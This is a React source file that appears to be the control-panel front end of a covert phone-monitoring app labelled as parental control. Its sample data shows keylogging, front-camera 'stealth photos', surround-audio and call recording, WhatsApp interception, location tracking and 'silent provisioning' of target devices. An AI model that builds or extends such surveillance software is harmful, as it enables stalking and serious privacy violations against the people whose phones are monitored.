import React, { useState } from 'react';
import { MainLayout } from './layouts/MainLayout';
import { DashboardOverviewPage } from './pages/DashboardOverviewPage';
import { WhatsAppPage } from './pages/WhatsAppPage';
import { DeviceInfo, MetricSummary, ActivityEvent } from './types/dashboard.types';

export default function App() {
  const [activeTab, setActiveTab] = useState<string>('dashboard');

  const availableDevices: DeviceInfo[] = [
    {
      id: 'dev_01',
      alias: "Child's Phone",
      model: 'SM-A15S6 (Galaxy S23)',
      manufacturer: 'Samsung',
      androidVersion: '14',
      imei: '35473307256675X',
      simOperator: 'Airtel',
      batteryLevel: 85,
      isCharging: false,
      isOnline: true,
      lastConnected: 'a few seconds ago',
      appVersion: '8.1.8 - 218',
      capabilities: {
        accessibility: true,
        deviceOwner: true,
        gps: true,
        batteryExempt: true,
        twoWayRecording: true,
      }
    },
    {
      id: 'dev_02',
      alias: 'Tablet #02',
      model: 'Pixel 8 Pro',
      manufacturer: 'Google',
      androidVersion: '14',
      imei: '86420194817290X',
      simOperator: 'Jio 5G',
      batteryLevel: 62,
      isCharging: true,
      isOnline: true,
      lastConnected: '5m ago',
      appVersion: '8.1.8 - 218',
      capabilities: {
        accessibility: true,
        deviceOwner: true,
        gps: true,
        batteryExempt: true,
        twoWayRecording: false,
      }
    }
  ];

  const [currentDevice, setCurrentDevice] = useState<DeviceInfo>(availableDevices[0]);

  const metrics: MetricSummary = {
    whatsappMessages: 24,
    whatsappCalls: 4,
    callRecordings: 12,
    smsLogs: 8,
    locationPoints: 142,
    surroundAudioCount: 6,
    stealthPhotos: 8,
    screenshots: 6,
    keylogsCount: 142,
    webHistoryCount: 45,
    blockedAppsCount: 3,
    contactsCount: 248
  };

  const activityEvents: ActivityEvent[] = [
    {
      id: 'evt_01',
      source: 'whatsapp',
      title: 'WhatsApp Incoming Chat',
      description: 'Alex: "Meeting at 5 PM near central park"',
      timestamp: '2 mins ago'
    },
    {
      id: 'evt_02',
      source: 'calls',
      title: 'Phone Call Recorded',
      description: 'Incoming call from +91 98765 43210 (2m 14s audio)',
      timestamp: '14 mins ago'
    },
    {
      id: 'evt_03',
      source: 'location',
      title: 'Geofence Event',
      description: 'Target device entered "Home Safety Zone"',
      timestamp: '32 mins ago'
    },
    {
      id: 'evt_04',
      source: 'keylogger',
      title: 'Keylogger Text Input',
      description: 'Typed in Chrome: "python programming guide 2026"',
      timestamp: '1h ago'
    },
    {
      id: 'evt_05',
      source: 'system',
      title: 'Device Owner Verification',
      description: 'Path A silent provisioning status confirmed active',
      timestamp: '2h ago'
    },
    {
      id: 'evt_06',
      source: 'media',
      title: 'Stealth Photo Uploaded',
      description: 'Front camera stealth capture stored in S3/R2',
      timestamp: '3h ago'
    }
  ];

  const renderCurrentPage = () => {
    switch (activeTab) {
      case 'whatsapp':
        return <WhatsAppPage device={currentDevice} />;
      case 'dashboard':
      default:
        return (
          <DashboardOverviewPage
            device={currentDevice}
            metrics={metrics}
            activityEvents={activityEvents}
            onSelectFeature={(featureId) => setActiveTab(featureId)}
            onRefreshDevice={() => console.log('Refreshing device diagnostics...')}
          />
        );
    }
  };

  return (
    <MainLayout
      currentDevice={currentDevice}
      availableDevices={availableDevices}
      onSelectDevice={(dev) => setCurrentDevice(dev)}
      activeTab={activeTab}
      onSelectTab={(tabId) => setActiveTab(tabId)}
    >
      {renderCurrentPage()}
    </MainLayout>
  );
}
